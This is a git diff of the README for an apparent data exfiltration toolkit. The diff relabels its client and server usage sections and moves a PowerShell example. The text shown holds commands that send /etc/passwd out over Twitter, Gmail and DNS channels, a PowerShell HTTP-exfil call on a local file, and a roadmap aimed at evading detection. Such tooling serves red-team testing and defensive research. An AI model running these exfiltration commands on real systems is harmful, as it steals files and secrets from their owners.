@@ -112,7 +112,9 @@ optional arguments:
   -L          Server mode
 ```
 
-## Client-side: 
+## Server-side: 
+
+To load every plugin:
 
 ```bash
 python det.py -L -c ./config.json -p twitter,gmail
@@ -130,20 +132,12 @@ To load every plugin and exclude DNS:
 python det.py -L -c ./config.json -e dns
 ```
 
-And in PowerShell (HTTP module): 
-
-```powershell
-PS C:\Users\user01\Desktop>
-PS C:\Users\user01\Desktop> . .\http_exfil.ps1
-PS C:\Users\user01\Desktop> HTTP-exfil 'C:\path\to\file.exe'
-```
-
-## Server-side:
+## Client-side:
 
 To load every plugin: 
 
 ```bash
-python det.py -c ./config.json -p twitter,gmail -f /etc/passwd
+python det.py -c ./config.json -f /etc/passwd
 ```
 
 To load *only* twitter and gmail modules: 
@@ -156,6 +150,13 @@ To load every plugin and exclude DNS:
 
 ```bash
 python det.py -c ./config.json -e dns -f /etc/passwd
+```
+And in PowerShell (HTTP module): 
+
+```powershell
+PS C:\Users\user01\Desktop>
+PS C:\Users\user01\Desktop> . .\http_exfil.ps1
+PS C:\Users\user01\Desktop> HTTP-exfil 'C:\path\to\file.exe'
 ```
 
 # Modules
@@ -188,7 +189,7 @@ Data so far is not encrypted and just HEX/XOR'ed which can be detected if deep a
 
 # Roadmap
 
-- [ ] Compression (! extremely important)
+- [ ] Compression (extremely important!)
 - [ ] Add proper encryption (eg. AES-256)
 - [ ] Proper data obfuscation and integrating [Markovobfuscate](https://github.com/bwall/markovobfuscate)
 - [ ] FTP, FlickR [LSB Steganography](https://github.com/RobinDavid/LSB-Steganography) and Youtube modules
